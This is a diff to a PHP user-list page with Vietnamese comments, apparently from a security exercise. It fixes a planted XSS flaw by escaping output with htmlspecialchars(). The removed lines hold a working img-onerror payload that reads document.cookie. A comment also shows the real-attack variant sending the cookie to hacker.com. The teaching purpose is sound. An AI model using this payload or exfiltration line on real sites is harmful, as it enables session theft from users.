@@ -26,8 +26,8 @@ $users = $userModel->getUsers($params);
 <?php include 'views/header.php'?>
 <div class="container">
     <?php if (!empty($users)) {?>
-        <div class="alert alert-danger" role="alert">
-            **CHÚ Ý:LỖ HỔNG XSS!** <br> Mã độc sẽ được kích hoạt nếu có người dùng tên 'admin'.
+        <div class="alert alert-success" role="alert">
+            **ĐÃ BẢO MẬT:** Đã áp dụng htmlspecialchars() để ngăn chặn mã độc XSS.
         </div>
         <table class="table table-striped">
             <thead>
@@ -47,29 +47,11 @@ $users = $userModel->getUsers($params);
                         <?php
                         $malicious_name = $user['name'];
                         if ($user['name'] == 'admin') {
-                            // Dữ liệu ĐỘC HẠI được giả lập lấy từ database.
-                            // Payload XSS phức tạp để lấy và hiển thị cookie lên trang.
-                            $malicious_name = "Admin 
-                                <img src=x onerror='
-                                    var stolenCookie = document.cookie;
-                                    var displayDiv = document.createElement(\"div\");
-                                    
-                                    // giao diện cảnh báo rõ cookie bị đánh cắp
-                                    displayDiv.innerHTML = \"<hr><b style=\\\"color:red;\\\">[ĐÃ BỊ TẤN CÔNG] Cookie bị đánh cắp: </b>\" + stolenCookie;
-                                    displayDiv.style.backgroundColor = \"#ffe0e0\";
-                                    displayDiv.style.border = \"3px dashed red\";
-                                    displayDiv.style.padding = \"15px\";
-                                    displayDiv.style.marginTop = \"20px\";
-                                    displayDiv.style.fontSize = \"16px\";
-                                    
-                                    // Chèn cảnh báo vào đầu body của trang để nó luôn hiển thị
-                                    document.body.insertBefore(displayDiv, document.body.firstChild);
-                                    
-                                    // Kẻ tấn công thực tế sẽ dùng: new Image().src=\"http://hacker.com/log.php?c=\" + stolenCookie;
-                                '>";
+                            // Dữ liệu ĐỘC HẠI được giả lập lấy từ database (vẫn tồn tại)
+                            $malicious_name = "Admin";
                         }
-                        // LỖ HỔNG XSS: In chuỗi mã độc trực tiếp ra HTML mà KHÔNG LỌC
-                        echo $malicious_name;
+                        // GIẢI PHÁP XSS: Sử dụng htmlspecialchars() để VÔ HIỆU HÓA mã độc
+                        echo htmlspecialchars($malicious_name);
                         ?>
                     </td>
                     <td>
